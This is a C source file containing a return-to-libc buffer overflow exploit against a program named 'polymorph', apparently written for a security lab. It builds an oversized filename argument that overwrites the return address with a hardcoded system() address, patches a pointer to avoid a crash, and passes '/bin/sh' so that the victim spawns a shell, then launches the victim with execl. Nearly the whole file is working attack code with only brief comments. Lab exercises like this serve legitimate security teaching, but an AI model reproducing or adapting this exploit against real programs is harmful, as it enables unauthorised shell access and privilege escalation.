#include <stdio.h>
#include <stdlib.h>

// #define OFFSET_TO_RETURN_ADDR 1032// 4128
// #define OFFSET_TO_ARG_1 1041 //4164   // Argument 1 stroe at saved ebp+8 (4156+8)
// #define SYSTEM_CALL_ADDRESS 0xb7e42160
// #define EXIT_CALL_ADDRESS 0xb7e35c90

int main(int argc, char *argv[]){

    // filename will be feed into the target buffer in polyporph 
    // then original, then newname

    char filename[4148];

    // file the buffer with random data
    memset((void*)filename, 'a', sizeof(filename));

    // // get the address of the value of environment variable SHELL
    // // which contains string /bin/bash
    // unsigned addr_shell = (unsigned)getenv("SHELL");
    // printf("address of SHELL %p\n", addr_shell);
    // //filename[OFFSET_TO_ARG_1] = (unsigned)addr_shell;

    // address of system
    filename[4128]=0x60;
    filename[4129]=0x21;
    filename[4130]=0xe4;
    filename[4131]=0xb7;

    // address of target 0x0804d180
    // correctly override the address of target otherwise it will cause
    // segement fault in polymorph.c:229 strcpy( original, newname );
    filename[4132]=0x80;
    filename[4133]=0xd1;
    filename[4134]=0x04;
    filename[4135]=0x08;

    // address of /bin/bash in global variable target, 0x0804e1ac
    filename[4136] = 0xac;
    filename[4137] = 0xe1;
    filename[4138] = 0x04;
    filename[4139] = 0x08;

    // put string /bin/sh in buffer as the address of environment variable
    // each process receive changes, but the address of global variable 
    // is stable
    filename[4140] = '/';
    filename[4141] = 'b';
    filename[4142] = 'i';
    filename[4143] = 'n';
    filename[4144] = '/';
    filename[4145] = 's';
    filename[4146] = 'h';
    filename[4147] = '\0';

    // execute the victim program and feed in the exploit inpu
    execl("./polymorph", "polymorph", "-f", filename, NULL);

    return 0;

}
